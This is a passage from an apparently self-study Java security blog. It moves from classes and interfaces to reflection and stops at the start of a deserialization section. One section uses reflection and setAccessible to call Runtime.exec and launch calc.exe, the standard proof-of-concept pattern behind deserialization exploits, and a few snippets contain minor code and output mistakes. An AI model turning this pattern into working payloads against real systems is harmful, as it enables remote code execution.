一个Java文件中只能有一个<code>public</code>类，并且这个<code>public</code>类的名称必须与文件名相同。这样的类可以从其他包中访问。</li><li><strong>非public类：</strong> 一个Java文件可以包含多个非public类，它们的访问级别被限制在同一包中。这些类不能被其他包中的类直接访问。</li></ul></blockquote><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;I am %s, and I am %d years old.\n&quot;</span>, name, age);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1 year later,&quot;</span>);</span><br><span class="line">        n4c1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;I will be %d&quot;</span>, n4c1.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308210528171.png" alt="image-20240308210528171"></p><p><strong>extends</strong></p><p>SuperMan.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SuperMan</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123; <span class="comment">//创建构造器</span></span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">superPower</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can do this all day!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>(<span class="string">&quot;n4c1&quot;</span> ,<span class="number">19</span>);</span><br><span class="line">        n4c1.superPower();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308213418330.png" alt="image-20240308213418330"></p><p><strong>implements</strong></p><p>略</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>与php相似</p><p>略</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><blockquote><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p></blockquote><blockquote><h4 id="接口与类的区别："><a href="#接口与类的区别：" class="headerlink" title="接口与类的区别："></a>接口与类的区别：</h4><ul><li>接口不能用于实例化对象。</li><li>接口没有构造方法。</li><li>接口中所有的方法必须是抽象方法，Java 8 之后 接口中可以使用 default 关键字修饰的非抽象方法。</li><li>接口不能包含成员变量，除了 static 和 final 变量。</li><li>接口不是被类继承了，而是要被类实现。</li><li>接口支持多继承。</li></ul><h4 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h4><ul><li>接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li><li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li></ul><h4 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h4><ul><li><ol><li>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li></ol></li><li><ol start="2"><li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li></ol></li><li><ol start="3"><li>接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li></ol></li><li><ol start="4"><li>一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li></ol></li></ul></blockquote><h3 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h3><p>当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。</p><p>Animal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog travel&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.eat();</span><br><span class="line">        dog.travel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Dog eat</span></span><br><span class="line"><span class="comment">//   Dog travel</span></span><br></pre></td></tr></table></figure><h3 id="接口的多继承"><a href="#接口的多继承" class="headerlink" title="接口的多继承"></a>接口的多继承</h3><p>在Java中，类的多继承是不合法，但接口允许多继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hockey</span> <span class="keyword">extends</span> <span class="title class_">Sports</span>, Event</span><br></pre></td></tr></table></figure><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>在Java中，集合（Collection）是一种用于存储和操作一组对象的数据结构。集合框架（Collection Framework）是Java中的一个重要部分，提供了一系列接口和类，用于表示和操作不同类型的集合。Java的集合框架主要包括以下接口和类：</p><ol><li><strong>Collection 接口：</strong> 是所有集合框架的根接口，它定义了一些基本的方法，如添加、删除、遍历等。<code>List</code>、<code>Set</code> 和 <code>Queue</code> 接口都继承自 <code>Collection</code>。</li><li><strong>List 接口：</strong> 继承自 <code>Collection</code>，表示有序的集合，允许包含重复元素。常见的实现类包括 <code>ArrayList</code>、<code>LinkedList</code> 和 <code>Vector</code>。</li><li><strong>Set 接口：</strong> 也继承自 <code>Collection</code>，表示不包含重复元素的集合。常见的实现类包括 <code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code>。</li><li><strong>Queue 接口：</strong> 继承自 <code>Collection</code>，表示一种队列的数据结构，常见的实现类包括 <code>LinkedList</code> 和 <code>PriorityQueue</code>。</li><li><strong>Map 接口：</strong> 表示键值对的集合，每个键映射到一个值。常见的实现类包括 <code>HashMap</code>、<code>LinkedHashMap</code>、<code>TreeMap</code> 和 <code>HashTable</code>。</li></ol><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射有关的API：</p><blockquote><p>java.lang.Class: 代表一个类<br>java.lang.reflect.Method: 代表类的方法<br>java.lang.relect.Field: 代表类的成员变量<br>java.lang.reflect.Constructor: 代表类的构造器</p></blockquote><p>由于Class类是private私有属性, 其构造器是私有的, 我们无法直接new Class();围绕如何获取Class类的对象来学习反射机制</p><h2 id="类的-class属性"><a href="#类的-class属性" class="headerlink" title="类的.class属性"></a>类的.class属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;  <span class="comment">///////////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p1.getClass(); <span class="comment">/////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: I am n4c1, and I am 19 years old.</span></span><br><span class="line"><span class="comment">//class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="Class-forName-String-className-：动态加载类"><a href="#Class-forName-String-className-：动态加载类" class="headerlink" title="Class.forName(String className)：动态加载类"></a>Class.forName(String className)：动态加载类</h2><p>调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><blockquote><p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p><p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p><p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。</p><p>所以我们在获取class对象中，一般使用Class.forName方法去获取。</p></blockquote><h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><blockquote><p>获取成员变量Field位于java.lang.reflect.Field包中</p><p>Field[] getFields() ：获取所有public修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.n4c1.www.Person&quot;</span>);</span><br><span class="line">        System.out.println(c3.getName());</span><br><span class="line"></span><br><span class="line">        Field[] fieldArray1 = c3.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fieldArray1) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="comment">// com.n4c1.www.Person</span></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// age</span></span><br></pre></td></tr></table></figure><h2 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h2><blockquote><p><strong>Method getMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的public方法</p><p><strong>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes)</strong> &#x2F;&#x2F;返回该类所声明的所有方法</p><p>&#x2F;&#x2F;第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><p><strong>Method[] getMethods()</strong> &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p><strong>Method[] getDeclaredMethods()</strong> &#x2F;&#x2F; 获取该类中的所有方法</p></blockquote><h2 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h2><blockquote><p>Constructor&lt;?&gt;[] getConstructors() ：只返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes) : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes) ： 匹配和参数配型相符的构造函数</p></blockquote><h2 id="通过反射来生成实例化对象"><a href="#通过反射来生成实例化对象" class="headerlink" title="通过反射来生成实例化对象"></a>通过反射来生成实例化对象</h2><h3 id="newInstance-方法创建类对象"><a href="#newInstance-方法创建类对象" class="headerlink" title="newInstance()方法创建类对象"></a>newInstance()方法创建类对象</h3><h3 id="invoke-执行类对象方法"><a href="#invoke-执行类对象方法" class="headerlink" title="invoke()执行类对象方法"></a>invoke()执行类对象方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射测试成功!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// 创建类实例对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// 获取reflectMethod方法</span></span><br><span class="line">            method.invoke(m); <span class="comment">// 调用类实例对象方法</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射构造Runtime类执行"><a href="#利用反射构造Runtime类执行" class="headerlink" title="利用反射构造Runtime类执行"></a>利用反射构造Runtime类执行</h2><p>反射弹计算器</p><p><code>C:\\WINDOWS\\System32\\calc.exe</code></p><p>Runtime类的构造方法是private权限私有的,反射机制也是有限制的，并不能饶过private权限的检查。</p><p>因此我们不能使用newInstance()来创建一个对象Runtime()</p><p>但是可以直接调用其类方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">RuntimeMethod</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//通过 getMethod 方法获取 Runtime 类中的 getRuntime 方法的 Method 对象。这个方法用于获取当前运行时对象。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> RuntimeMethod.invoke(c1); <span class="comment">//使用反射调用 getRuntime 方法，得到 Runtime 类的实例。invoke 方法用于调用指定对象的方法，这里调用了 getRuntime 方法。</span></span><br><span class="line">        method.invoke(m, <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1),<span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="设置setAccessible-true-暴力访问权限"><a href="#设置setAccessible-true-暴力访问权限" class="headerlink" title="设置setAccessible(true)暴力访问权限"></a>设置setAccessible(true)暴力访问权限</h2><blockquote><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我并没有成功弹计算器, 不知道是不是jdk版本的问题</p><p>换成jdk1.8这里就可以了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309112318876.png" alt="image-20240309112318876"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><strong>序列化</strong>: ObjectOutputStream.WriteObject</p><p><strong>反序列化</strong>: ObjectInputStream.readObject</p><blockquote><p>只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列</p><p>Serializable 接口是 Java 提供的序列化接口,一个实现 Serializable 接口的子类也是可以被序列化的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Useri</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Useri</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        Serialize(user);</span><br><span class="line"></span><br><span class="line">        